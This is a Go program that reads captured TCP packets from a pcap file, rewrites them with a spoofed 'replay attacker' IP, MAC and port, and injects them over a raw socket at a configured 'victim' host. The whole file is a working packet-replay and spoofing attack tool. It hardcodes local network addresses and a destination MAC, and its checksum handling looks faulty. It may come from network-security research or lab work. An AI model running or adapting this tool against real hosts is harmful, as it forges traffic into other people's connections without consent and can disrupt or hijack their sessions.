package main

// Use tcpdump to create a test file
// tcpdump -w test.pcap
// or use the example above for writing pcap files

import (
    "fmt"
    "github.com/google/gopacket"
    "github.com/google/gopacket/pcap"
    "github.com/google/gopacket/layers"
    "log"
    "net"
    //"io"
    //"bufio"
    "io/ioutil"
    "os"
    "strconv"
    "strings"
    "time"
    "math/rand"
)

var (
    handle1   *pcap.Handle
    handle2   *pcap.Handle
    timeout   time.Duration = 20 * time.Second
    err      error
    buffer       gopacket.SerializeBuffer
    options      gopacket.SerializeOptions
)

func check(e error) {
    if e != nil {
        panic(e)
    }
}


func tcpipChecksum(data []byte, csum uint32) uint16 {
	// to handle odd lengths, we loop to length - 1, incrementing by 2, then
	// handle the last byte specifically by checking against the original
	// length.
	length := len(data) - 1
	for i := 0; i < length; i += 2 {
		// For our test packet, doing this manually is about 25% faster
		// (740 ns vs. 1000ns) than doing it by calling binary.BigEndian.Uint16.
		csum += uint32(data[i]) << 8
		csum += uint32(data[i+1])
	}
	if len(data)%2 == 1 {
		csum += uint32(data[length]) << 8
	}
	for csum > 0xffff {
		csum = (csum >> 16) + (csum & 0xffff)
	}
	return ^uint16(csum)
}

func main() {
    if os.Args[1] != "-s"{ os.Exit(1)}
    var csum_new uint32 = 0
    dat, err := ioutil.ReadFile(os.Args[2])
    check(err)

    s := strings.Split(string(dat), "\n")
    log_file_name, victim_ip, victim_mac, victim_port, attacker_ip, attacker_mac, attacker_port, eplay_victim_ip, replay_victim_mac, replay_victim_port := s[0], s[1], s[2], s[3], s[4], s[5], s[6], s[7], s[8], s[9]
    replay_attacker_ip, replay_attacker_mac, replay_attacker_port, device, timing := s[10], s[11], s[12], s[13], s[14]
    srcIP := net.ParseIP(replay_attacker_ip)
    dstIP := net.ParseIP(victim_ip)
    dstIPaddr := net.IPAddr{
        IP: dstIP,
    }
    my_mac, err := net.ParseMAC(replay_attacker_mac)
    fmt.Printf("Victim_Mac: ")
    //new_victim_mac, err := net.ParseMAC(victim_mac)
    new_victim_port, err := strconv.Atoi(victim_port)
    my_port, err := strconv.Atoi(replay_attacker_port)
    my_port = my_port + rand.Intn(50)
    fmt.Printf("log_file_name = %s, victim_ip = %s, victim_mac = %s, victim_port = %s, attacker_ip = %s, attacker_mac = %s, attacker_port = %s, eplay_victim_ip = %s, replay_victim_mac = %s, replay_victim_port = %s\n", log_file_name, victim_ip, victim_mac, victim_port, attacker_ip, attacker_mac, attacker_port, eplay_victim_ip, replay_victim_mac, replay_victim_port)
    fmt.Printf("replay_attacker_ip = %s, replay_attacker_mac = %s, replay_attacker_port = %s, device = %s, timing = %s\n", replay_attacker_ip, replay_attacker_mac, replay_attacker_port, device, timing)
    // Open file instead of device
    var filter string = fmt.Sprintf("tcp and dst host %s and ( src host %s or src host %s )", victim_ip, "192.168.2.16", "192.168.2.97")
    var filter_pcap string = fmt.Sprintf("tcp and dst host %s", victim_ip)
    handle2, err := pcap.OpenLive(device, 65000, false, timeout)
    if err != nil {log.Fatal(err) }
    defer handle2.Close()

    err = handle2.SetBPFFilter(filter)
    if err != nil {
      log.Fatal(err)
    }
    handle1, err = pcap.OpenOffline(log_file_name)
    if err != nil { log.Fatal(err) }
    defer handle1.Close()

    err = handle1.SetBPFFilter(filter_pcap)
    if err != nil {
      log.Fatal(err)
    }
    // Loop through packets in file
    packetSource := gopacket.NewPacketSource(handle1, handle1.LinkType())
    for packet := range packetSource.Packets() {
      // This time lets fill out some information
      if new_tcpLayer := packet.Layer(layers.LayerTypeTCP); new_tcpLayer != nil{
        tcp, _ := new_tcpLayer.(*layers.TCP)
        fmt.Printf("From src port %d to dst port %d; seq: %d, options : %s fields: \n\n%+v\n", tcp.SrcPort, tcp.DstPort, tcp.Seq, tcp.Options, tcp)
        syn_flag := tcp.SYN
        ack_flag := tcp.ACK
        fin_flag := tcp.FIN
        rst_flag := tcp.RST
        new_ipLayer := packet.Layer(layers.LayerTypeIPv4)
        new_ethernetLayer := packet.Layer(layers.LayerTypeEthernet)
        ip, _ := new_ipLayer.(*layers.IPv4)
        eth, _ := new_ethernetLayer.(*layers.Ethernet)
        fmt.Printf("IP Layer\n\n%+v\n", ip)
        fmt.Printf("Ethernet Layer\n\n%+v\n", eth)
      ipLayer := &layers.IPv4{
          SrcIP: srcIP,
          DstIP: dstIP,
          Protocol: layers.IPProtocolTCP,
          IHL: ip.IHL,
          Flags: ip.Flags,
          Checksum: ip.Checksum,
          TTL: ip.TTL,
          Version: ip.Version,
      }
      ethernetLayer := &layers.Ethernet{
          SrcMAC: my_mac,
          //DstMAC: new_victim_mac,
          DstMAC: net.HardwareAddr{0x00, 0x1A, 0xA0, 0xEB, 0xF0, 0xCF},

          EthernetType: eth.EthernetType,
      }
      tcpLayer := &layers.TCP{
          SrcPort: layers.TCPPort(my_port),
          DstPort: layers.TCPPort(new_victim_port),
          SYN: syn_flag,
          ACK: ack_flag,
          FIN: fin_flag,
          RST: rst_flag,
          Seq: tcp.Seq,
          Ack: tcp.Ack,
          DataOffset: tcp.DataOffset,
          Window: tcp.Window,
          Checksum: 0,
          Options: tcp.Options,
      }
      options := gopacket.SerializeOptions {
      ComputeChecksums: true,
    }
      // And create the packet with the layers
      buffer = gopacket.NewSerializeBuffer()
      gopacket.SerializeLayers(buffer, options,
          ethernetLayer,
          ipLayer,
          tcpLayer,
      )
      csum_new = 0
      tcpLayer = &layers.TCP{
        SrcPort: layers.TCPPort(my_port),
        DstPort: layers.TCPPort(new_victim_port),
        SYN: syn_flag,
        ACK: ack_flag,
        FIN: fin_flag,
        RST: rst_flag,
        Seq: tcp.Seq,
        Ack: tcp.Ack,
        DataOffset: tcp.DataOffset,
        Window: tcp.Window,
        Options: tcp.Options,
        Checksum: tcpipChecksum(buffer.Bytes(), csum_new),
      }
      fmt.Printf("\n\nchecksum? : %d\n\n", tcpipChecksum(buffer.Bytes(), csum_new))
      buffer = gopacket.NewSerializeBuffer()
      gopacket.SerializeLayers(buffer, options,
          ethernetLayer,
          ipLayer,
          tcpLayer,
      )
      ipConn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
      if err != nil {
          panic(err)
      }
      _, err = ipConn.WriteTo(buffer.Bytes(), &dstIPaddr)
      if err != nil {
          panic(err)
      }
      time.Sleep(time.Second * 2)
      //readstuff := ""
      //readstuff, err = ipConn.ReadFrom(buffer.Bytes(), &dstIPaddr)
      //if err != nil {
      //    panic(err)
      //}
      buf := make([]byte, 1024)
      numRead, _, _ := ipConn.ReadFrom(buf)
      fmt.Printf("%x X\n", buf[:numRead])
      log.Print("packet sent!\n")
      fmt.Println(packet)
    }
    }
}
